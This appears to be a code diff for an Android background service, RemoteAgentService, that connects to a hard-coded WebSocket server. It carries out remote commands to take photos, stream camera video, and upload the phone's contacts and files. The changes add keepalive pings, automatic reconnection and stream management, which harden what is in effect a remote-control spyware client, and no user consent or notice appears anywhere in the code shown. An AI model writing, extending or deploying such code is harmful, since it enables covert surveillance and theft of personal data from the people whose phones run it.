@@ -18,7 +18,6 @@ import java.io.File
 import java.io.FileInputStream
 import java.net.URLConnection
 import java.util.concurrent.CountDownLatch
-import java.util.concurrent.Executors
 import android.content.Context
 import android.hardware.camera2.*
 import android.media.ImageReader
@@ -28,8 +27,6 @@ import android.content.pm.PackageManager
 import android.graphics.ImageFormat
 import android.provider.ContactsContract
 import com.google.gson.Gson
-import java.io.PipedInputStream
-import java.io.PipedOutputStream
 import org.java_websocket.client.WebSocketClient
 import org.java_websocket.handshake.ServerHandshake
 import org.json.JSONObject
@@ -43,9 +40,8 @@ import okhttp3.Response
 import okhttp3.WebSocket
 import okhttp3.WebSocketListener
 import okio.ByteString
-import java.io.ByteArrayOutputStream
 import android.Manifest
-
+import androidx.core.app.ActivityCompat
 
 
 class RemoteAgentService : Service() {
@@ -63,62 +59,120 @@ class RemoteAgentService : Service() {
         connectWebSocket()
     }
 
+    private var reconnecting = false
+    private var isStreaming = false
+
     private fun connectWebSocket() {
+
+        println("🌐 Trying to connect to WebSocket...")
+
         try {
-            val serverUri = URI("ws://192.168.31.50:3003/ws") // Node.js WebSocket server
+            val serverUri = URI("ws://192.168.31.50:3003/ws")
             wsClient = object : WebSocketClient(serverUri) {
+
                 override fun onOpen(handshakedata: ServerHandshake?) {
                     println("✅ Connected to WebSocket server")
+                    reconnecting = false
+
                     val registerMsg = """{"type":"hello","deviceId":"$deviceId"}"""
                     send(registerMsg)
+
+                    // 🔹 Start ping keepalive
+                    startPingTimer()
+
+                    // ✅ Delay video start until handshake is definitely acknowledged
+//                    Handler(Looper.getMainLooper()).postDelayed({
+//                        if (!isStreaming) {
+//                            isStreaming = true
+//                            handleVideo("front")
+//                        }
+//                    }, 1000)
                 }
+
 
                 override fun onMessage(message: String?) {
                     if (message == null) return
-                    println("📩 Message from server: $message")
-
                     try {
                         val json = JSONObject(message)
-                        val command = json.optString("type")
-                        val which = json.optString("which", "")
-
-                        when (command) {
-                            "capture" -> handleCapture(which)
-                            "video" -> handleVideo(which)
+                        when (json.optString("type")) {
+                            "capture" -> handleCapture(json.optString("which"))
+                            "video" -> handleVideo(json.optString("which"))
                             "contacts" -> handleContactsUpload()
                             "files" -> handleFileUpload()
                             "ping" -> wsClient?.send("{\"type\":\"pong\",\"deviceId\":\"$deviceId\"}")
-                            else -> println("⚠️ Unknown command: $command")
+//                            "stop_video" -> stopCamera() // optional stop command
                         }
                     } catch (e: Exception) {
-                        e.printStackTrace()
+                        println("⚠️ Error parsing message: ${e.message}")
                     }
                 }
 
-
                 override fun onClose(code: Int, reason: String?, remote: Boolean) {
                     println("❌ WebSocket closed: $reason")
-                    reconnectWebSocket()
+                    stopStreaming()
+                    scheduleReconnect()
                 }
 
                 override fun onError(ex: Exception?) {
                     println("⚠️ WebSocket error: ${ex?.message}")
-                    reconnectWebSocket()
+                    stopStreaming()
+                    scheduleReconnect()
                 }
+
             }
+
             wsClient?.connect()
         } catch (e: Exception) {
             e.printStackTrace()
+            scheduleReconnect()
+        }
+    }
+
+    private fun startPingTimer() {
+        val handler = Handler(Looper.getMainLooper())
+        val runnable = object : Runnable {
+            override fun run() {
+                try {
+                    wsClient?.send("{\"type\":\"ping\",\"deviceId\":\"$deviceId\"}")
+                    handler.postDelayed(this, 10000) // every 10s
+                } catch (e: Exception) {
+                    println("⚠️ Ping failed: ${e.message}")
+                }
+            }
+        }
+        handler.postDelayed(runnable, 10000)
+    }
+
+    private fun scheduleReconnect() {
+        if (reconnecting) return
+        reconnecting = true
+        println("🔁 Reconnecting WebSocket in 3s…")
+
+        Handler(Looper.getMainLooper()).postDelayed({
+            reconnecting = false // ✅ allow next attempt
+            connectWebSocket()
+        }, 3000)
+    }
+
+    private fun stopStreaming() {
+        if (isStreaming) {
+            println("🛑 stopStreaming called — delegating to stopCameraStreaming()")
+            isStreaming = false
+            stopCameraStreaming()
         }
     }
 
 
-    private fun reconnectWebSocket() {
-        Handler(Looper.getMainLooper()).postDelayed({
-            println("🔁 Reconnecting WebSocket…")
-            connectWebSocket()
-        }, 5000)
-    }
+//    private fun reconnectWebSocket() {
+//        if (reconnecting) return
+//        reconnecting = true
+//
+//        println("♻️ Reconnecting in 3s...")
+//        Handler(Looper.getMainLooper()).postDelayed({
+//            connectWebSocket()
+//        }, 3000)
+//    }
+
 
     private fun getContactsJson(): String {
         val contactsList = mutableListOf<Map<String, String>>()
@@ -143,14 +197,18 @@ class RemoteAgentService : Service() {
 
 
     private fun handleCapture(which: String) {
+
+        if (which == "stop") {
+            stopCameraStreaming()
+            return
+        }
+
         val cameraList = when (which) {
             "front" -> listOf(CameraCharacteristics.LENS_FACING_FRONT)
             "back" -> listOf(CameraCharacteristics.LENS_FACING_BACK)
-            "both" -> listOf(
-                CameraCharacteristics.LENS_FACING_FRONT,
-                CameraCharacteristics.LENS_FACING_BACK
-            )
-            else -> listOf(CameraCharacteristics.LENS_FACING_BACK)
+            else -> {
+                listOf(CameraCharacteristics.LENS_FACING_BACK)
+            }
         }
 
         Thread {
@@ -417,7 +475,81 @@ class RemoteAgentService : Service() {
     }
 
 
+    private var ws: WebSocket? = null
+    private var cameraDevice: CameraDevice? = null
+    private var handlerThread: HandlerThread? = null
+    private var imageReader: ImageReader? = null
+
+    // Track active components for safe stopping
+    private var activeCamera: CameraDevice? = null
+    private var activeSession: CameraCaptureSession? = null
+    private var activeThread: HandlerThread? = null
+    private var activeWs: WebSocket? = null
+    private var activeLensFacing: Int? = null
+
+    private fun stopCameraStreaming() {
+        println("🛑 Stopping camera stream...")
+
+        try {
+            // 1) stop repeating on whichever session exists
+            try {
+                activeSession?.stopRepeating()
+            } catch (ise: IllegalStateException) {
+                println("⚠️ stopRepeating failed on activeSession: ${ise.message}")
+            } catch (e: Exception) {
+                println("⚠️ stopRepeating exception on activeSession: ${e.message}")
+            }
+            try {
+                cameraDevice = cameraDevice ?: activeCamera
+                // also protect old session variable if you used it directly
+                activeSession?.stopRepeating()
+            } catch (_: Exception) {}
+
+            // 2) close/clear capture sessions
+            try { activeSession?.close() } catch (e: Exception) { println("⚠️ close activeSession: ${e.message}") }
+            activeSession = null
+            try { /* if you had another 'session' variable, close it too */ } catch (_: Exception) {}
+
+            // 3) remove image listener and close reader
+            try { imageReader?.setOnImageAvailableListener(null, null) } catch (_: Exception) {}
+            try { imageReader?.close() } catch (e: Exception) { println("⚠️ imageReader close: ${e.message}") }
+            imageReader = null
+
+            // 4) close camera devices (both references)
+            try { activeCamera?.close() } catch (e: Exception) { println("⚠️ activeCamera close: ${e.message}") }
+            activeCamera = null
+            try { cameraDevice?.close() } catch (e: Exception) { println("⚠️ cameraDevice close: ${e.message}") }
+            cameraDevice = null
+
+            // 5) quit handler threads (both references)
+            try { activeThread?.quitSafely() } catch (e: Exception) { println("⚠️ activeThread quit: ${e.message}") }
+            activeThread = null
+            try { handlerThread?.quitSafely() } catch (e: Exception) { println("⚠️ handlerThread quit: ${e.message}") }
+            handlerThread = null
+
+            // 6) close websocket(s)
+            try { activeWs?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ activeWs close: ${e.message}") }
+            activeWs = null
+            try { ws?.close(1000, "Stopped") } catch (e: Exception) { println("⚠️ ws close: ${e.message}") }
+            ws = null
+
+            // 7) clear lens flag
+            activeLensFacing = null
+
+            println("✅ Camera stopped cleanly.")
+        } catch (e: Exception) {
+            println("❌ stopCameraStreaming top-level error: ${e.message}")
+        }
+    }
+
+
+
+
+    // 🔹 Start streaming video (front/back)
     private fun streamCameraVideo(lensFacing: Int) {
+        // Stop any previous stream before starting a new one
+        stopCameraStreaming()
+
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
             != PackageManager.PERMISSION_GRANTED
         ) {
@@ -425,7 +557,7 @@ class RemoteAgentService : Service() {
             return
         }
 
-        val wsUrl = "ws://192.168.31.50:3003/ws" // 🔹 change to your Node.js server IP
+        val wsUrl = "ws://192.168.31.50:3003/ws"
         val client = OkHttpClient()
         val request = Request.Builder().url(wsUrl).build()
         val ws = client.newWebSocket(request, object : WebSocketListener() {
@@ -438,9 +570,11 @@ class RemoteAgentService : Service() {
                 println("❌ WebSocket failed: ${t.message}")
             }
         })
+        activeWs = ws
 
         val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
         val handlerThread = HandlerThread("VideoStreamThread").apply { start() }
+        activeThread = handlerThread
         val handler = Handler(handlerThread.looper)
 
         try {
@@ -453,13 +587,18 @@ class RemoteAgentService : Service() {
 
             val stateCallback = object : CameraDevice.StateCallback() {
                 override fun onOpened(camera: CameraDevice) {
+                    activeCamera = camera
+
                     try {
                         val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                         request.addTarget(reader.surface)
 
-                        camera.createCaptureSession(listOf(reader.surface),
+                        camera.createCaptureSession(
+                            listOf(reader.surface),
                             object : CameraCaptureSession.StateCallback() {
                                 override fun onConfigured(session: CameraCaptureSession) {
+                                    activeSession = session
+
                                     reader.setOnImageAvailableListener({ r ->
                                         val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                                         val buffer = img.planes[0].buffer
@@ -468,11 +607,10 @@ class RemoteAgentService : Service() {
                                         img.close()
 
                                         try {
-                                            ws.send(ByteString.of(*bytes)) // 🔹 send raw JPEG frame
+                                            activeWs?.send(ByteString.of(*bytes))
                                         } catch (e: Exception) {
                                             println("⚠️ WS send failed: ${e.message}")
-                                            camera.close()
-                                            handlerThread.quitSafely()
+                                            stopCameraStreaming()
                                         }
                                     }, handler)
 
@@ -480,35 +618,47 @@ class RemoteAgentService : Service() {
                                 }
 
                                 override fun onConfigureFailed(session: CameraCaptureSession) {
-                                    session.close()
-                                    camera.close()
-                                    handlerThread.quitSafely()
+                                    println("❌ Camera config failed")
+                                    stopCameraStreaming()
                                 }
-                            }, handler
+                            },
+                            handler
                         )
                     } catch (e: Exception) {
                         e.printStackTrace()
-                        handlerThread.quitSafely()
+                        stopCameraStreaming()
                     }
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
-                    camera.close()
-                    handlerThread.quitSafely()
+                    println("⚠️ Camera disconnected")
+                    stopCameraStreaming()
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
-                    camera.close()
-                    handlerThread.quitSafely()
+                    println("❌ Camera error: $error")
+                    stopCameraStreaming()
                 }
             }
 
             cameraManager.openCamera(cameraId, stateCallback, handler)
+
         } catch (e: Exception) {
             e.printStackTrace()
-            handlerThread.quitSafely()
+            stopCameraStreaming()
         }
     }
+
+
+
+
+
+
+
+    private fun stopCamera() {
+        stopCameraStreaming()
+    }
+
 
 
 
